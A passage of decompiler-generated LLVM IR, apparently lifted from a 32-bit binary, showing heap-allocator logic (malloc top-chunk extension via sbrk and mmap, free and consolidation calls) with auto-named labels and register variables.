  store i32 %v2_80523d8, i32* @edx, align 4
  %v1_80523db = or i32 %v1_805244e, 1
  store i32 %v1_80523db, i32* %eax.global-to-local, align 4
  store i32 %v2_80523d8, i32* @global_var_80678cc.732, align 4
  store i32 %v1_80523db, i32* %v2_80523c6, align 4
  %v0_80523e7 = load i32, i32* %ecx.global-to-local, align 4
  %v5_80523e7 = sub i32 %v0_80523e7, %v1_805244e
  store i32 %v5_80523e7, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052743

dec_label_pc_80523f0:                             ; preds = %dec_label_pc_80523b9
  %v0_80523f0 = load i32, i32* @global_var_8067bfc.737, align 4
  store i32 %v0_80523f0, i32* %edx.global-to-local, align 4
  %v0_80523f6 = load i8, i8* @global_var_80678a0.731, align 32
  %v1_80523f6 = and i8 %v0_80523f6, 2
  %v2_80523f6 = icmp eq i8 %v1_80523f6, 0
  br i1 %v2_80523f6, label %dec_label_pc_8052424, label %dec_label_pc_80523ff

dec_label_pc_80523ff:                             ; preds = %dec_label_pc_80523f0
  store i32 ptrtoint (i8* @global_var_80678a0.731 to i32), i32* %stack_var_-92, align 4
  %v2_8052407 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80678a0.731 to i32*))
  store i32 ptrtoint (i8* @global_var_80678a0.731 to i32), i32* @ebx, align 4
  %v1_8052411 = add i32 %v1_805244e, -7
  store i32 %v1_8052411, i32* %eax.global-to-local, align 4
  store i32 %v1_8052411, i32* %stack_var_-92, align 4
  %v1_8052415 = call i32 @malloc(i32 %v1_8052411)
  store i32 %v1_8052415, i32* %eax.global-to-local, align 4
  store i32 %v1_8052415, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80527b3

dec_label_pc_8052424:                             ; preds = %dec_label_pc_80523f0
  %v1_8052424 = add i32 %v0_80523f0, -1
  store i32 %v1_8052424, i32* @ecx, align 4
  store i32 %v1_805244e, i32* @ebx, align 4
  %v1_805242f = load i32, i32* @global_var_8067bec.738, align 4
  %v7_805242f = icmp ult i32 %v1_805244e, %v1_805242f
  br i1 %v7_805242f, label %dec_label_pc_80524f1, label %dec_label_pc_805243b

dec_label_pc_805243b:                             ; preds = %dec_label_pc_8052424
  %v0_805243b = load i32, i32* @global_var_8067bf0.739, align 16
  store i32 %v0_805243b, i32* %eax.global-to-local, align 4
  %v1_8052440 = load i32, i32* @global_var_8067bf4.740, align 4
  %v5_8052446 = icmp slt i32 %v0_805243b, %v1_8052440
  br i1 %v5_8052446, label %dec_label_pc_805244c, label %dec_label_pc_80524f1

dec_label_pc_805244c:                             ; preds = %dec_label_pc_805243b
  %v2_805244e = add i32 %v1_805244e, 10
  %v3_805244e = add i32 %v2_805244e, %v0_80523f0
  %v1_8052452 = sub i32 0, %v0_80523f0
  store i32 %v1_8052452, i32* %eax.global-to-local, align 4
  %v2_8052454 = and i32 %v3_805244e, %v1_8052452
  store i32 %v2_8052454, i32* @ebx, align 4
  %tmp129 = icmp ugt i32 %v2_8052454, %v1_805244e
  br i1 %tmp129, label %dec_label_pc_8052460, label %dec_label_pc_80524f1

dec_label_pc_8052460:                             ; preds = %dec_label_pc_805244c
  store i32 0, i32* %stack_var_-92, align 4
  %v8_805246d = call i32 @mmap(i32 0, i32 %v2_8052454, i32 3, i32 34, i32 0, i32 0, i32 %v1_8052424, i32 %v1_8052424)
  store i32 %v8_805246d, i32* %eax.global-to-local, align 4
  store i32 %v8_805246d, i32* @edx, align 4
  %v10_8052477 = icmp eq i32 %v8_805246d, -1
  br i1 %v10_8052477, label %dec_label_pc_8052460.dec_label_pc_80524f1_crit_edge, label %dec_label_pc_805247c

dec_label_pc_8052460.dec_label_pc_80524f1_crit_edge: ; preds = %dec_label_pc_8052460
  %v0_80524f1.pre = load i32, i32* @global_var_80678cc.732, align 4
  br label %dec_label_pc_80524f1

dec_label_pc_805247c:                             ; preds = %dec_label_pc_8052460
  %v1_805247e = urem i32 %v8_805246d, 8
  %v2_805247e = icmp eq i32 %v1_805247e, 0
  store i32 %v1_805247e, i32* @ecx, align 4
  br i1 %v2_805247e, label %dec_label_pc_8052496, label %dec_label_pc_8052483

dec_label_pc_8052483:                             ; preds = %dec_label_pc_805247c
  %v0_8052488 = load i32, i32* @ebx, align 4
  %v2_805248a = sub nsw i32 8, %v1_805247e
  store i32 %v2_805248a, i32* %eax.global-to-local, align 4
  %v2_805248c = add i32 %v2_805248a, %v8_805246d
  store i32 %v2_805248c, i32* @edx, align 4
  %v2_805248e = sub i32 %v0_8052488, %v2_805248a
  store i32 %v2_805248e, i32* %esi.global-to-local, align 4
  %v2_8052490 = inttoptr i32 %v2_805248c to i32*
  store i32 %v2_805248a, i32* %v2_8052490, align 4
  br label %dec_label_pc_805249e

dec_label_pc_8052496:                             ; preds = %dec_label_pc_805247c
  %v1_8052496 = inttoptr i32 %v8_805246d to i32*
  store i32 0, i32* %v1_8052496, align 4
  br label %dec_label_pc_805249e

dec_label_pc_805249e:                             ; preds = %dec_label_pc_8052483, %dec_label_pc_8052496
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8052483 ], [ @ebx, %dec_label_pc_8052496 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_805249e = or i32 %storemerge, 2
  %v1_80524a1 = load i32, i32* @edx, align 4
  %v2_80524a1 = add i32 %v1_80524a1, 4
  %v3_80524a1 = inttoptr i32 %v2_80524a1 to i32*
  store i32 %v1_805249e, i32* %v3_80524a1, align 4
  %v0_80524a4 = load i32, i32* @global_var_8067bf0.739, align 16
  %v1_80524a9 = add i32 %v0_80524a4, 1
  store i32 %v1_80524a9, i32* %eax.global-to-local, align 4
  store i32 %v1_80524a9, i32* @global_var_8067bf0.739, align 16
  %v1_80524af = load i32, i32* @global_var_8067bf8.741, align 8
  %v7_80524b5 = icmp sgt i32 %v1_80524a9, %v1_80524af
  br i1 %v7_80524b5, label %dec_label_pc_80524b7, label %dec_label_pc_80524bc

dec_label_pc_80524b7:                             ; preds = %dec_label_pc_805249e
  store i32 %v1_80524a9, i32* @global_var_8067bf8.741, align 8
  br label %dec_label_pc_80524bc

dec_label_pc_80524bc:                             ; preds = %dec_label_pc_805249e, %dec_label_pc_80524b7
  %v0_80524bc = load i32, i32* @global_var_8067c04.742, align 4
  %v1_80524c1 = load i32, i32* @ebx, align 4
  %v2_80524c1 = add i32 %v1_80524c1, %v0_80524bc
  store i32 %v2_80524c1, i32* %eax.global-to-local, align 4
  store i32 %v2_80524c1, i32* @global_var_8067c04.742, align 4
  %v1_80524c8 = load i32, i32* @global_var_8067c10.743, align 16
  %tmp130 = icmp ugt i32 %v2_80524c1, %v1_80524c8
  br i1 %tmp130, label %dec_label_pc_80524d0, label %dec_label_pc_80524d5

dec_label_pc_80524d0:                             ; preds = %dec_label_pc_80524bc
  store i32 %v2_80524c1, i32* @global_var_8067c10.743, align 16
  br label %dec_label_pc_80524d5

dec_label_pc_80524d5:                             ; preds = %dec_label_pc_80524bc, %dec_label_pc_80524d0
  %v1_80524d5 = load i32, i32* @global_var_8067c08.744, align 8
  %v2_80524d5 = add i32 %v1_80524d5, %v2_80524c1
  store i32 %v2_80524d5, i32* %eax.global-to-local, align 4
  %v1_80524db = load i32, i32* @global_var_8067c14.745, align 4
  %tmp131 = icmp ugt i32 %v2_80524d5, %v1_80524db
  br i1 %tmp131, label %dec_label_pc_80524e7, label %dec_label_pc_8052138

dec_label_pc_80524e7:                             ; preds = %dec_label_pc_80524d5
  store i32 %v2_80524d5, i32* @global_var_8067c14.745, align 4
  br label %dec_label_pc_8052138

dec_label_pc_80524f1:                             ; preds = %dec_label_pc_805244c, %dec_label_pc_8052460.dec_label_pc_80524f1_crit_edge, %dec_label_pc_805243b, %dec_label_pc_8052424
  %v0_80524f1 = phi i32 [ %v0_80524f1.pre, %dec_label_pc_8052460.dec_label_pc_80524f1_crit_edge ], [ %v0_80523b9, %dec_label_pc_805243b ], [ %v0_80523b9, %dec_label_pc_805244c ], [ %v0_80523b9, %dec_label_pc_8052424 ]
  store i32 %v0_80524f1, i32* %eax.global-to-local, align 4
  %v1_80524fa = add i32 %v0_80524f1, 4
  %v2_80524fa = inttoptr i32 %v1_80524fa to i32*
  %v3_80524fa = load i32, i32* %v2_80524fa, align 4
  %v1_8052504 = and i32 %v3_80524fa, -4
  %v2_8052504 = icmp eq i32 %v1_8052504, 0
  store i32 %v1_8052504, i32* @ebp, align 4
  %v1_8052507 = load i32, i32* @global_var_8067be8.746, align 8
  %v2_8052507 = add i32 %v1_8052507, %v1_80523c3
  store i32 %v2_8052507, i32* %eax.global-to-local, align 4
  %v0_805250d = load i8, i8* @global_var_8067c00.747, align 1024
  %v1_805250d = urem i8 %v0_805250d, 2
  %v2_805250d = icmp eq i8 %v1_805250d, 0
  br i1 %v2_805250d, label %dec_label_pc_8052518, label %dec_label_pc_8052516

dec_label_pc_8052516:                             ; preds = %dec_label_pc_80524f1
  %v2_8052516 = sub i32 %v2_8052507, %v1_8052504
  store i32 %v2_8052516, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052518

dec_label_pc_8052518:                             ; preds = %dec_label_pc_80524f1, %dec_label_pc_8052516
  %v0_805251c = phi i32 [ %v2_8052507, %dec_label_pc_80524f1 ], [ %v2_8052516, %dec_label_pc_8052516 ]
  %v5_805251c = add i32 %v0_805251c, %v1_8052424
  store i32 %v5_805251c, i32* %eax.global-to-local, align 4
  %v1_8052520 = sub i32 0, %v0_80523f0
  store i32 %v1_8052520, i32* @edx, align 4
  %v2_8052528 = and i32 %v5_805251c, %v1_8052520
  store i32 %v2_8052528, i32* @esi, align 4
  %tmp88 = icmp slt i32 %v2_8052528, 1
  br i1 %tmp88, label %dec_label_pc_8052542, label %dec_label_pc_805252c

dec_label_pc_805252c:                             ; preds = %dec_label_pc_8052518
  store i32 %v2_8052528, i32* %stack_var_-92, align 4
  %v1_8052530 = call i32 @__GI_sbrk(i32 %v2_8052528)
  store i32 %v1_8052530, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_8052530, i32* @ebx, align 4
  %v10_805253d = icmp eq i32 %v1_8052530, -1
  %v1_8052540 = icmp eq i1 %v10_805253d, false
  br i1 %v1_8052540, label %dec_label_pc_8052598.dec_label_pc_80525a1_crit_edge, label %dec_label_pc_805252c.dec_label_pc_8052542_crit_edge

dec_label_pc_805252c.dec_label_pc_8052542_crit_edge: ; preds = %dec_label_pc_805252c
  %v0_8052542.pre = load i8, i8* @global_var_8067c00.747, align 1024
  br label %dec_label_pc_8052542

dec_label_pc_8052542:                             ; preds = %dec_label_pc_805252c.dec_label_pc_8052542_crit_edge, %dec_label_pc_8052518
  %v0_805256e = phi i32 [ -1, %dec_label_pc_805252c.dec_label_pc_8052542_crit_edge ], [ %v1_8052520, %dec_label_pc_8052518 ]
  %v0_8052542 = phi i8 [ %v0_8052542.pre, %dec_label_pc_805252c.dec_label_pc_8052542_crit_edge ], [ %v0_805250d, %dec_label_pc_8052518 ]
  %v1_8052542 = urem i8 %v0_8052542, 2
  %v2_8052542 = icmp eq i8 %v1_8052542, 0
  br i1 %v2_8052542, label %dec_label_pc_8052542.dec_label_pc_8052557_crit_edge, label %dec_label_pc_805254b

dec_label_pc_8052542.dec_label_pc_8052557_crit_edge: ; preds = %dec_label_pc_8052542
  %v0_8052557.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052557

dec_label_pc_805254b:                             ; preds = %dec_label_pc_8052542
  %v2_805254f = add i32 %v1_8052504, %v1_8052424
  store i32 %v2_805254f, i32* %eax.global-to-local, align 4
  %v0_8052551 = load i32, i32* @esi, align 4
  %v2_8052551 = add i32 %v0_8052551, %v2_805254f
  %v5_8052553 = and i32 %v2_8052551, %v1_8052520
  store i32 %v5_8052553, i32* @esi, align 4
  br label %dec_label_pc_8052557

dec_label_pc_8052557:                             ; preds = %dec_label_pc_8052542.dec_label_pc_8052557_crit_edge, %dec_label_pc_805254b
  %v0_8052557 = phi i32 [ %v0_8052557.pre, %dec_label_pc_8052542.dec_label_pc_8052557_crit_edge ], [ %v5_8052553, %dec_label_pc_805254b ]
  %tmp132 = icmp ult i32 %v0_8052557, 1048576
  br i1 %tmp132, label %dec_label_pc_805255f, label %dec_label_pc_8052564

dec_label_pc_805255f:                             ; preds = %dec_label_pc_8052557
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_8052564

dec_label_pc_8052564:                             ; preds = %dec_label_pc_8052557, %dec_label_pc_805255f
  %v0_8052578 = phi i32 [ %v0_8052557, %dec_label_pc_8052557 ], [ 1048576, %dec_label_pc_805255f ]
  %tmp133 = icmp ugt i32 %v0_8052578, %v1_805244e
  br i1 %tmp133, label %dec_label_pc_805256e, label %dec_label_pc_80527a6

dec_label_pc_805256e:                             ; preds = %dec_label_pc_8052564
  store i32 0, i32* %stack_var_-92, align 4
  %v8_805257b = call i32 @mmap(i32 0, i32 %v0_8052578, i32 3, i32 34, i32 0, i32 0, i32 %v0_805256e, i32 %v0_805256e)
  store i32 %v8_805257b, i32* %eax.global-to-local, align 4
  store i32 %v8_805257b, i32* @ebx, align 4
  %v10_8052585 = icmp eq i32 %v8_805257b, -1
  br i1 %v10_8052585, label %dec_label_pc_80527a6, label %dec_label_pc_8052598.thread

dec_label_pc_8052598.thread:                      ; preds = %dec_label_pc_805256e
  %v0_805258e = load i8, i8* @global_var_8067c00.747, align 1
  %v2_805258e = and i8 %v0_805258e, -2
  store i8 %v2_805258e, i8* @global_var_8067c00.747, align 1024
  %v1_8052595 = load i32, i32* @esi, align 4
  %v2_8052595 = add i32 %v1_8052595, %v8_805257b
  store i32 %v2_8052595, i32* @edx, align 4
  br label %dec_label_pc_80525a1

dec_label_pc_8052598.dec_label_pc_80525a1_crit_edge: ; preds = %dec_label_pc_805252c
  %v1_80525a5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80525a1

dec_label_pc_80525a1:                             ; preds = %dec_label_pc_8052598.dec_label_pc_80525a1_crit_edge, %dec_label_pc_8052598.thread
  %v1_80525a5 = phi i32 [ %v1_8052595, %dec_label_pc_8052598.thread ], [ %v1_80525a5.pre, %dec_label_pc_8052598.dec_label_pc_80525a1_crit_edge ]
  %v0_805266d92 = phi i32 [ %v8_805257b, %dec_label_pc_8052598.thread ], [ %v1_8052530, %dec_label_pc_8052598.dec_label_pc_80525a1_crit_edge ]
  %v0_805265f91 = phi i32 [ %v2_8052595, %dec_label_pc_8052598.thread ], [ -1, %dec_label_pc_8052598.dec_label_pc_80525a1_crit_edge ]
  %v0_80525a5 = load i32, i32* @global_var_8067c08.744, align 8
  %v2_80525a5 = add i32 %v1_80525a5, %v0_80525a5
  store i32 %v2_80525a5, i32* @global_var_8067c08.744, align 8
  %v2_80525ab = add i32 %v1_8052504, %v0_80524f1
  store i32 %v2_80525ab, i32* %ecx.global-to-local, align 4
  %v2_80525ad = sub i32 %v0_805266d92, %v2_80525ab
  %v7_80525ad = icmp ult i32 %v0_805266d92, %v2_80525ab
  %v12_80525ad = icmp eq i32 %v2_80525ad, 0
  %v1_80525af = icmp eq i1 %v12_80525ad, false
  br i1 %v1_80525af, label %dec_label_pc_80525c8, label %dec_label_pc_80525b1

dec_label_pc_80525b1:                             ; preds = %dec_label_pc_80525a1
  %v10_80525b1 = icmp eq i32 %v0_805265f91, -1
  %v1_80525b4 = icmp eq i1 %v10_80525b1, false
  br i1 %v1_80525b4, label %dec_label_pc_80525c8, label %dec_label_pc_80525b6

dec_label_pc_80525b6:                             ; preds = %dec_label_pc_80525b1
  %v2_80525b6 = add i32 %v1_80525a5, %v1_8052504
  store i32 %v0_80524f1, i32* %ecx.global-to-local, align 4
  %v1_80525bd = or i32 %v2_80525b6, 1
  store i32 %v1_80525bd, i32* %eax.global-to-local, align 4
  store i32 %v1_80525bd, i32* %v2_80524fa, align 4
  br label %dec_label_pc_80526f5

dec_label_pc_80525c8:                             ; preds = %dec_label_pc_80525b1, %dec_label_pc_80525a1
  %v0_80525c8 = load i8, i8* @global_var_8067c00.747, align 1
  %v1_80525c8 = sext i8 %v0_80525c8 to i32
  store i32 %v1_80525c8, i32* %eax.global-to-local, align 4
  %v2_80525cd = urem i8 %v0_80525c8, 2
  %v3_80525cd = icmp eq i8 %v2_80525cd, 0
  br i1 %v3_80525cd, label %dec_label_pc_80525e1, label %dec_label_pc_80525d1

dec_label_pc_80525d1:                             ; preds = %dec_label_pc_80525c8
  br i1 %v2_8052504, label %dec_label_pc_80525e1, label %dec_label_pc_80525d5

dec_label_pc_80525d5:                             ; preds = %dec_label_pc_80525d1
  %v1_80525d7 = icmp eq i1 %v7_80525ad, false
  br i1 %v1_80525d7, label %dec_label_pc_80525e1, label %dec_label_pc_80525d9

dec_label_pc_80525d9:                             ; preds = %dec_label_pc_80525d5
  %v1_80525d9 = and i32 %v1_80525c8, -2
  %v4_80525d9 = trunc i32 %v1_80525d9 to i8
  store i32 %v1_80525d9, i32* %eax.global-to-local, align 4
  store i8 %v4_80525d9, i8* @global_var_8067c00.747, align 1024
  br label %dec_label_pc_80525e1

dec_label_pc_80525e1:                             ; preds = %dec_label_pc_80525d5, %dec_label_pc_80525d1, %dec_label_pc_80525c8, %dec_label_pc_80525d9
  %v0_80525e1 = phi i8 [ %v0_80525c8, %dec_label_pc_80525d5 ], [ %v0_80525c8, %dec_label_pc_80525d1 ], [ %v0_80525c8, %dec_label_pc_80525c8 ], [ %v4_80525d9, %dec_label_pc_80525d9 ]
  %v1_80525e1 = urem i8 %v0_80525e1, 2
  %v2_80525e1 = icmp eq i8 %v1_80525e1, 0
  br i1 %v2_80525e1, label %dec_label_pc_805265f, label %dec_label_pc_80525ea

dec_label_pc_80525ea:                             ; preds = %dec_label_pc_80525e1
  br i1 %v2_8052504, label %dec_label_pc_80525f8, label %dec_label_pc_80525ee

dec_label_pc_80525ee:                             ; preds = %dec_label_pc_80525ea
  store i32 %v2_80525ad, i32* %eax.global-to-local, align 4
  %v2_80525f2 = add i32 %v2_80525a5, %v2_80525ad
  store i32 %v2_80525f2, i32* @global_var_8067c08.744, align 8
  br label %dec_label_pc_80525f8

dec_label_pc_80525f8:                             ; preds = %dec_label_pc_80525ea, %dec_label_pc_80525ee
  %v1_80525fa = urem i32 %v0_805266d92, 8
  %v2_80525fa = icmp eq i32 %v1_80525fa, 0
  store i32 %v1_80525fa, i32* %edx.global-to-local, align 4
  %v1_80525fd = icmp eq i1 %v2_80525fa, false
  br i1 %v1_80525fd, label %dec_label_pc_8052605, label %dec_label_pc_80525ff

dec_label_pc_80525ff:                             ; preds = %dec_label_pc_80525f8
  store i32 %v0_805266d92, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805260f

dec_label_pc_8052605:                             ; preds = %dec_label_pc_80525f8
  %v2_805260a = sub nsw i32 8, %v1_80525fa
  store i32 %v2_805260a, i32* %eax.global-to-local, align 4
  %v2_805260c = add i32 %v2_805260a, %v0_805266d92
  store i32 %v2_805260c, i32* @edi, align 4
  br label %dec_label_pc_805260f

dec_label_pc_805260f:                             ; preds = %dec_label_pc_80525ff, %dec_label_pc_8052605
  %v0_8052612 = phi i32 [ 0, %dec_label_pc_80525ff ], [ %v2_805260a, %dec_label_pc_8052605 ]
  %v2_805260f = add i32 %v1_80525a5, %v0_805266d92
  %v2_8052612 = add i32 %v0_8052612, %v1_8052504
  store i32 %v2_8052612, i32* %ecx.global-to-local, align 4
  %v2_805261b = add i32 %v2_8052612, %v2_805260f
  store i32 %v2_805261b, i32* %edx.global-to-local, align 4
  %v2_8052621 = add i32 %v2_805261b, %v1_8052424
  %v5_8052624 = and i32 %v2_8052621, %v1_8052520
  %v2_805262b = sub i32 %v5_8052624, %v2_805261b
  store i32 %v2_805262b, i32* %eax.global-to-local, align 4
  %v2_805262d = add i32 %v2_805262b, %v2_8052612
  store i32 %v2_805262d, i32* @esi, align 4
  store i32 %v2_805262d, i32* %stack_var_-92, align 4
  %v1_8052631 = call i32 @__GI_sbrk(i32 %v2_805262d)
  store i32 %v1_8052631, i32* %eax.global-to-local, align 4
  store i32 %v1_8052631, i32* @edx, align 4
  %v10_805263b = icmp eq i32 %v1_8052631, -1
  %v1_805263e = icmp eq i1 %v10_805263b, false
  br i1 %v1_805263e, label %dec_label_pc_805264e, label %dec_label_pc_8052640

dec_label_pc_8052640:                             ; preds = %dec_label_pc_805260f
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8052645 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8052645, i32* %eax.global-to-local, align 4
  store i32 %v1_8052645, i32* @edx, align 4
  br label %dec_label_pc_8052682

dec_label_pc_805264e:                             ; preds = %dec_label_pc_805260f
  %v1_805264e = load i32, i32* @ebx, align 4
  %v7_805264e = icmp ult i32 %v1_8052631, %v1_805264e
  %v1_8052650 = icmp eq i1 %v7_805264e, false
  br i1 %v1_8052650, label %dec_label_pc_8052687, label %dec_label_pc_8052652

dec_label_pc_8052652:                             ; preds = %dec_label_pc_805264e
  %v0_8052652 = load i8, i8* @global_var_8067c00.747, align 1
  %v2_8052652 = and i8 %v0_8052652, -2
  store i8 %v2_8052652, i8* @global_var_8067c00.747, align 1024
  store i32 %v2_805260f, i32* @edx, align 4
  br label %dec_label_pc_8052666

dec_label_pc_805265f:                             ; preds = %dec_label_pc_80525e1
  %v10_805265f = icmp eq i32 %v0_805265f91, -1
  br i1 %v10_805265f, label %dec_label_pc_805266a, label %dec_label_pc_8052664

dec_label_pc_8052664:                             ; preds = %dec_label_pc_805265f
  store i32 %v0_805266d92, i32* @edi, align 4
  br label %dec_label_pc_8052666

dec_label_pc_8052666:                             ; preds = %dec_label_pc_8052652, %dec_label_pc_8052664
  %v0_805268749 = phi i32 [ %v2_805260f, %dec_label_pc_8052652 ], [ %v0_805265f91, %dec_label_pc_8052664 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8052687

dec_label_pc_805266a:                             ; preds = %dec_label_pc_805265f
  store i32 %v0_805266d92, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8052671 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8052671, i32* @edx, align 4
  %v1_8052678 = load i32, i32* @ebx, align 4
  %v2_8052678 = sub i32 %v1_8052671, %v1_8052678
  %v1_805267a = load i32, i32* @esi, align 4
  %v2_805267a = sub i32 %v2_8052678, %v1_805267a
  store i32 %v2_805267a, i32* %eax.global-to-local, align 4
  %v0_805267c = load i32, i32* @global_var_8067c08.744, align 8
  %v2_805267c = add i32 %v0_805267c, %v2_805267a
  store i32 %v2_805267c, i32* @global_var_8067c08.744, align 8
  br label %dec_label_pc_8052682

dec_label_pc_8052682:                             ; preds = %dec_label_pc_8052640, %dec_label_pc_805266a
  %v0_805268748 = phi i32 [ %v1_8052645, %dec_label_pc_8052640 ], [ %v1_8052671, %dec_label_pc_805266a ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8052687

dec_label_pc_8052687:                             ; preds = %dec_label_pc_805264e, %dec_label_pc_8052666, %dec_label_pc_8052682
  %v0_805268c = phi i32 [ %v1_8052631, %dec_label_pc_805264e ], [ %v0_805268749, %dec_label_pc_8052666 ], [ %v0_805268748, %dec_label_pc_8052682 ]
  %v10_8052687 = icmp eq i32 %v0_805268c, -1
  br i1 %v10_8052687, label %dec_label_pc_80526f5, label %dec_label_pc_805268c

dec_label_pc_805268c:                             ; preds = %dec_label_pc_8052687
  %v1_805268c = load i32, i32* @edi, align 4
  %v2_805268c = sub i32 %v0_805268c, %v1_805268c
  store i32 %v2_805268c, i32* @edx, align 4
  store i32 %v1_805268c, i32* @global_var_80678cc.732, align 4
  %v1_8052694 = load i32, i32* @esi, align 4
  %v2_8052694 = add i32 %v1_8052694, %v2_805268c
  %v1_8052697 = or i32 %v2_8052694, 1
  store i32 %v1_8052697, i32* %eax.global-to-local, align 4
  %v2_805269a = add i32 %v1_805268c, 4
  %v3_805269a = inttoptr i32 %v2_805269a to i32*
  store i32 %v1_8052697, i32* %v3_805269a, align 4
  %v0_805269d = load i32, i32* @global_var_8067c08.744, align 8
  %v1_805269d = load i32, i32* @esi, align 4
  %v2_805269d = add i32 %v1_805269d, %v0_805269d
  store i32 %v2_805269d, i32* @global_var_8067c08.744, align 8
  br i1 %v2_8052504, label %dec_label_pc_80526f5, label %dec_label_pc_80526a7

dec_label_pc_80526a7:                             ; preds = %dec_label_pc_805268c
  %v1_80526a7 = add i32 %v1_8052504, -12
  store i32 %v0_80524f1, i32* %ecx.global-to-local, align 4
  %v1_80526ae = and i32 %v1_80526a7, -8
  store i32 %v1_80526ae, i32* %eax.global-to-local, align 4
  %v1_80526b3 = or i32 %v1_80526ae, 1
  store i32 %v1_80526b3, i32* @edx, align 4
  %v5_80526b6 = icmp ult i32 %v1_80526ae, 15
  store i32 %v1_80526b3, i32* %v2_80524fa, align 4
  %v0_80526bc = load i32, i32* %ecx.global-to-local, align 4
  %v1_80526bc = load i32, i32* %eax.global-to-local, align 4
  %v2_80526bc = add i32 %v0_80526bc, 4
  %v3_80526bc = add i32 %v2_80526bc, %v1_80526bc
  %v4_80526bc = inttoptr i32 %v3_80526bc to i32*
  store i32 5, i32* %v4_80526bc, align 4
  %v0_80526c4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80526c4 = load i32, i32* %eax.global-to-local, align 4
  %v2_80526c4 = add i32 %v0_80526c4, 8
  %v3_80526c4 = add i32 %v2_80526c4, %v1_80526c4
  %v4_80526c4 = inttoptr i32 %v3_80526c4 to i32*
  store i32 5, i32* %v4_80526c4, align 4
  br i1 %v5_80526b6, label %dec_label_pc_80526f5, label %dec_label_pc_80526ce

dec_label_pc_80526ce:                             ; preds = %dec_label_pc_80526a7
  %v0_80526d1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80526d3 = add i32 %v0_80526d1, 8
  store i32 %v1_80526d3, i32* %eax.global-to-local, align 4
  %v0_80526d6 = load i32, i32* @global_var_8067be4.748, align 4
  store i32 %v0_80526d6, i32* @ebx, align 4
  store i32 %v1_80526d3, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8067be4.748, align 4
  %v1_80526e7 = call i32 @free(i32 %v1_80526d3)
  store i32 %v1_80526e7, i32* %eax.global-to-local, align 4
  %v0_80526ec = load i32, i32* @ebx, align 4
  store i32 %v0_80526ec, i32* @global_var_8067be4.748, align 4
  br label %dec_label_pc_80526f5

dec_label_pc_80526f5:                             ; preds = %dec_label_pc_80526a7, %dec_label_pc_805268c, %dec_label_pc_8052687, %dec_label_pc_80525b6, %dec_label_pc_80526ce
  %v0_80526f5 = load i32, i32* @global_var_8067c08.744, align 8
  store i32 %v0_80526f5, i32* %eax.global-to-local, align 4
  %v1_80526fa = load i32, i32* @global_var_8067c0c.749, align 4
  %tmp134 = icmp ugt i32 %v0_80526f5, %v1_80526fa
  br i1 %tmp134, label %dec_label_pc_8052702, label %dec_label_pc_8052707

dec_label_pc_8052702:                             ; preds = %dec_label_pc_80526f5
  store i32 %v0_80526f5, i32* @global_var_8067c0c.749, align 4
  br label %dec_label_pc_8052707

dec_label_pc_8052707:                             ; preds = %dec_label_pc_80526f5, %dec_label_pc_8052702
  %v1_8052707 = load i32, i32* @global_var_8067c04.742, align 4
  %v2_8052707 = add i32 %v1_8052707, %v0_80526f5
  store i32 %v2_8052707, i32* %eax.global-to-local, align 4
  %v1_805270d = load i32, i32* @global_var_8067c14.745, align 4
  %tmp135 = icmp ugt i32 %v2_8052707, %v1_805270d
  br i1 %tmp135, label %dec_label_pc_8052715, label %dec_label_pc_805271a

dec_label_pc_8052715:                             ; preds = %dec_label_pc_8052707
  store i32 %v2_8052707, i32* @global_var_8067c14.745, align 4
  br label %dec_label_pc_805271a

dec_label_pc_805271a:                             ; preds = %dec_label_pc_8052707, %dec_label_pc_8052715
  %v0_805271a = load i32, i32* @global_var_80678cc.732, align 4
  store i32 %v0_805271a, i32* @ebx, align 4
  %v1_8052720 = add i32 %v0_805271a, 4
  %v2_8052720 = inttoptr i32 %v1_8052720 to i32*
  %v3_8052720 = load i32, i32* %v2_8052720, align 4
  %v1_8052723 = and i32 %v3_8052720, -4
  store i32 %v1_8052723, i32* @ecx, align 4
  %v10_8052726 = icmp ult i32 %v1_8052723, %v1_80523c3
  br i1 %v10_8052726, label %dec_label_pc_80527a6, label %dec_label_pc_805272c

dec_label_pc_805272c:                             ; preds = %dec_label_pc_805271a
  store i32 %v1_805244e, i32* %esi.global-to-local, align 4
  %v2_8052732 = sub i32 %v1_8052723, %v1_805244e
  store i32 %v2_8052732, i32* %ecx.global-to-local, align 4
  %v2_8052734 = add i32 %v0_805271a, %v1_805244e
  store i32 %v2_8052734, i32* @edx, align 4
  %v1_8052737 = or i32 %v1_805244e, 1
  store i32 %v1_8052737, i32* %eax.global-to-local, align 4
  store i32 %v2_8052734, i32* @global_var_80678cc.732, align 4
  store i32 %v1_8052737, i32* %v2_8052720, align 4
  %v0_8052743.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052743

dec_label_pc_8052743:                             ; preds = %dec_label_pc_80523d4, %dec_label_pc_805272c
  %v0_8052743 = phi i32 [ %v5_80523e7, %dec_label_pc_80523d4 ], [ %v0_8052743.pre, %dec_label_pc_805272c ]
  %v1_8052743 = or i32 %v0_8052743, 1
  store i32 %v1_8052743, i32* @ecx, align 4
  %v0_8052746 = load i32, i32* @ebx, align 4
  %v1_8052746 = add i32 %v0_8052746, 8
  store i32 %v1_8052746, i32* %ebx.global-to-local, align 4
  %v1_8052749 = load i32, i32* @edx, align 4
  %v2_8052749 = add i32 %v1_8052749, 4
  %v3_8052749 = inttoptr i32 %v2_8052749 to i32*
